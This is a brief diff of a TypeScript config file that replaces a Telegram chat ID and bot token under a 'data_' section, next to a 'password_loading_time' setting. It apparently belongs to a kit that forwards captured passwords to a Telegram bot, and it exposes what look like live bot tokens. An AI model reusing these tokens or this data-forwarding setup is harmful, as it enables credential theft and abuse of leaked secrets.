@@ -18,8 +18,8 @@ const defaultConfig: Config = {
 		password_loading_time: 5000,
 	},
 	telegram: {
-		data_chatid: "-4738316861",
-		data_token: "7694232216:AAFr1lQiTB-JX7MdBlJ6gXq_yR7VM68Zp0c",
+		data_chatid: "-1003936865368",
+		data_token: "8878301736:AAGPeumTX4NGP7xK_OS_llF66_w-6XIB9pc",
 	},
 };
 const getConfig = (): Config => {
